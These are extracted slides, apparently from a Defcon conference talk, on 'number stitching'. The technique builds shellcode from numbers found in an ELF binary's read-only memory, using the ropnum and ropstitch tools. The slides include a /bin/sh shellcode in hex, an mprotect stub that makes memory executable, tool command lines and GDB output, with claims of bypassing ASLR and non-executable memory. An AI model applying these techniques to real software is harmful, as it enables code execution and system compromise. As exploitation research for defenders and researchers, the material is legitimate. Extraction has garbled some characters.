© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Scan memory regions in ELF: 
!  RO segment (contains .text, .rodata, …) is a good candidate: 
!  Read only so should not change at runtime 
!  If not PIE, addresses are constant 
!  Keep track of all numbers found and their addresses 
!  Find the best combination of numbers which add up to a chunk 
Approach 
Cisco Con!dential 
37 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  This is called the coin change problem 
!  If I buy an item at 4.25€ and pay with a 5€ note 
!  What’s the most e"cient way to return change? 
!  0.75€ change: 
!  1 50 cent coin  
!  1 20 cent coin 
!  1 5 cent coin  
Coin change problem 
Cisco Con!dential 
38 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  In dollars, answer is di$erent 
!  0.75$: 
!  1 half-dollar coin 
!  1 quarter 
!  Best solution depends on the coin set 
!  Our set of coins are the numbers found in memory 
In hex you’re a millionaire 
Cisco Con!dential 
39 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Ideal solution to the problem is using Dynamic Programming: 
!  Finds most e"cient solution 
!  Blows memory for big numbers 
!  I can’t scale it for big numbers yet 
!  Sub-optimal solution is the greedy approach: 
!  No memory footprint 
!  Can miss the solution 
!  Look for the biggest coin which !ts, then go down 
!  Luckily small numbers are easy to !nd in memory, meaning greedy will 
always succeed 
Solving the problem 
Cisco Con!dential 
40 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  75 cents change example: 
!  Try 2 euros
 ✖ 
!  Try 1 euro
 ✖ 
!  Try 50 cents
 ✔#
!  Try 20 cents
 ✔#
!  Try 10 cents
 ✖ 
!  Try 5 cents
 ✔ 
!  Found solution:  
Greedy approach 
Cisco Con!dential 
41 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Tool to !nd a solution to the coin change problem 
!  Give it a number, will get you the address of numbers which solve 
the coin change problem 
!  Can also: 
!  Ignore addresses with null-bytes  
!  Exclude numbers from the coin change solver 
!  Print all addresses pointing to a number  
!  … 
Introducing Ropnum 
Cisco Con!dential 
42 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Find me: 
!  The address of numbers… 
!  In the segment containing the .text section 
!  Which added together solve the coin change problem (i.e.: 0x01020304) 
Usage 
someone@something:~/somewhere$#ropnum.py#Bn#0x01020304#BS#Bs#.text#hw#2>#/dev/null##
Using#segments#instead#of#sections#to#perform#number#lookups.#
Using#sections#[.text]#for#segment#lookup.#
Found#loadable#segment#starting#at#[address#0x08048000,#offset#0x00000000]#
Found#a#solution#using#5#operations:#[16860748,#47811,#392,#104,#5]#
0x08048002#=>#0x0101464c#16860748#
0x0804804c#=>#0x00000005########5#
0x080482f6#=>#0x00000068######104#
0x08048399#=>#0x0000bac3####47811#
0x08048500#=>#0x00000188######392#
Cisco Con!dential 
43 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Now you can use an accumulating gadget on the found addresses 
!  add#eax#[ebxB0xb8a0008]#;#add#esp#0x4#;#pop#ebx#;#pop#
ebp#;;#
!  By controlling the value addressed by ebx, you control eax 
Ropnum continued 
someone@something:~/somewhere$#ropnum.py#Bn#0x01020304#BS#Bs#.text#hw#2>#/dev/null#
Found#a#solution#using#5#operations:#[16860748,#47811,#392,#104,#5]#
0x08048002#=>#0x0101464c#16860748#
0x0804804c#=>#0x00000005########5#
0x080482f6#=>#0x00000068######104#
0x08048399#=>#0x0000bac3####47811#
0x08048500#=>#0x00000188######392#
someone@something:~/somewhere$#python#Bc#'print#hex(0x00000188+0x0000bac3+0x00000068+0x00000005+0x0101464c)'###########
0x1020304#
Cisco Con!dential 
44 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
Putting it together 
Cisco Con!dential 
45 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Cut and order 4 byte shellcode chunks
!  Add numbers found in memory together until you reach a chunk 
!  Once a chunk is reached, dump it to a stack frame 
!  Repeat until shellcode is complete 
!  Transfer control to shellcode 
!  Git it at https://github.com/alexmgr/numstitch 
Summary 
Cisco Con!dential 
46 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  What it does: 
!  Takes an input shellcode, and a frame address 
!  Takes care of the tedious details (endianess, 2’s complement, padding, … ) 
!  Spits out some python code to generate your payload 
!  Additional features: 
!  Add an mprotect RWE stub frame before your stack 
!  Start with an arbitrary accumulator register value 
!  Lookup numbers in section or segments 
Introducing Ropstitch 
Cisco Con!dential 
47 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  The fake stack lives in a RW section 
!  You need to make that page RE 
!  Mprotect allows to change permissions at runtime 
!  The mprotect stub will change the permissions of the page to allow 
shellcode execution 
!  Mprotect(page base address, page size (0x1000), RWE (0x7)) 
Why do you need an mprotect stub 
Cisco Con!dential 
48 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Generate a python payload: 
!  To copy a /bin/sh shellcode: 
!  To a fake frame frame located at 0x08049110 (.data section) 
!  Appending an mprotect frame (default behaviour) 
!  Looking up numbers in RO segment 
!  In binary abinary 
Example usage 
someone@something:~/somewhere$#ropstitch.py#Bx#"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a
\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd
\x80"#Bf#0x08049110#BS#Bs#.text#Bp#abinary#2>#/dev/null#
Cisco Con!dential 
49 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  The tool will spit out some python code, where you need to add your 
gadget addresses 
!  Then run that to get your payload 
!  Output is too verbose. See an example and further explanations on 
numstitch_details.txt (Defcon CD) or here: 
https://github.com/alexmgr/numstitch 
Example tool output 
Cisco Con!dential 
50 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
GDB output 
gdbBpeda$#x/16w#0x804a11c#
0x804a11c:
#0xb7f31e00
#0x00000000
#0x00000000
#0x00000000#
0x804a12c:
#0x00000007
#0x00000000
#0x00000000
#0x00000000#
0x804a13c:
#0x00000000
#0x00000000
#0x00000000
#0x00000000#
0x804a14c:
#0x00000000
#0x00000000
#0x00000000
#0x00000000#
gdbBpeda$###Writing#int#0x80.#Notice#that#the#numbers#are#added#in#increasing#order:#
0x804a11c:
#0xb7f31e00
#0x00000000
#0x00000000
#0x00000000#
0x804a12c:
#0x00000007
#0x00000000
#0x00000000
#0x00000000#
0x804a13c:
#0x00000000
#0x00000000
#0x00000000
#0x00000000#
0x804a14c:
#0x00000000
#0x00000080
#0x00000000
#0x00000000#
gdbBpeda$###Writing#mprotect#page#size#(0x1000).#Notice#that#the#numbers#are#added#in#increasing#order:#
0x804a11c:
#0xb7f31e00
#0x00000000
#0x00000000
#0x00001000#
0x804a12c:
#0x00000007
#0x00000000
#0x00000000
#0x00000000#
0x804a13c:
#0x00000000
#0x00000000
#0x00000000
#0x00000000#
0x804a14c:
#0x00000000
#0x00000080
#0x00000000
#0x00000000#
gdbBpeda$#c#10#
gdbBpeda$###later#execution#(notice#the#missing#parts#of#shellcode,#which#will#be#filed#in#later,#once#
eax#reaches#a#slice#value):#
0x804a11c:
#0xb7f31e00
#0x0804a130
#0x0804a000
#0x00001000#
0x804a12c:
#0x00000007
#0x00000000
#0x2d686652
#0x52e18970#
0x804a13c:
#0x2f68686a
#0x68736162
#0x6e69622f
#0x5152e389#
0x804a14c:
#0x00000000
#0x00000080
#0x00000000
#0x00000000#
gdbBpeda$###end#result#(The#shellcode#is#complete#in#memory):#
0x804a11c:
#0xb7f31e00
#0x0804a130
#0x0804a000
#0x00001000#
0x804a12c:
#0x00000007
#0x99580b6a
#0x2d686652
#0x52e18970#
0x804a13c:
#0x2f68686a
#0x68736162
#0x6e69622f
#0x5152e389#
0x804a14c:
#0xcde18953
#0x00000080
#0x00000000
#0x00000000#
Cisco Con!dential 
51 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
Pros and cons 
Cisco Con!dential 
52 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Pros: 
!  Can encode any shellcode (no null-byte problem) 
!  Lower 2 bytes can be controlled by excluding those values from the 
addresses 
!  Not a$ected by RELRO, ASLR or X^W 
!  Cons: 
!  Payloads can be large, depending on the availability of number 
!  Thus requires a big stage-0, or a gadget table 
Number stitching 
Cisco Con!dential 
53 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
Further usage 
Cisco Con!dential 
54 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  What if the value of eax changes between runtimes? 
!  In stdcall convention, eax holds the return value of a function call 
!  Just call any function in the PLT 
!  There is a good chance you control the return value that way 
Initialize eax 
Cisco Con!dential 
55 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Number stitching can also be used to load further gadgets instead of 
a shellcode 
!  Concept of a gadget table 
!  Say you need: 
!  Pop ecx; ret;  
 => 59 c3 
!  Pop ebx; ret;  
 => 5b c3 
!  mov [ecx] ebx; ret;
 => 89 19 c3 
!  Your shellcode becomes: “\x59\xc3\x5b\xc3\x89\x19\xc3” 
Shrink the size of the stage-0 
Cisco Con!dential 
56 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Number stitching can transfer those bytes to memory 
!  ropstitch can change the memory permissions with the mprotect 
stub 
!  You can then just call the gadgets from the table as if they we’re part 
of the binary 
!  You have the ability to load any gadget or byte in memory 
!  This is not yet automated in the tool 
Gadget table 
Cisco Con!dential 
57 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
Future work 
Cisco Con!dential 
58 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Search if there are numbers in memory not subject to ASLR: 
!  Check binaries with PIE enabled to see if anything comes up 
!  By de!nition, probably wont come up with anything, but who knows? 
!  Search for gadgets in new versions of libc/gcc. Seems di"cult, but 
might yield a new approach 
General 
Cisco Con!dential 
59 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  Get dynamic programming approach to work with large numbers: 
!  Challenging 
!  64 bit support. Easy, numbers are just bigger. Mprotect stack might 
be harder because of the di$erent ABI 
!  Introduce a mixed approach: 
!  String copying for bytes available 
!  Number stitching for others 
!  Maybe contribute it to some rop tools (if they’re interested) 
!  Simplify the concept of gadget tables in the tool 
Tooling 
Cisco Con!dential 
60 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
Contact details 
Cisco Con!dential 
61 
© 2013-2014  Cisco and/or its a"liates. All rights reserved. 
!  PI:EMAIL 
!  https://github.com/alexmgr/numstitch 
Alex Moneger 
Thank you!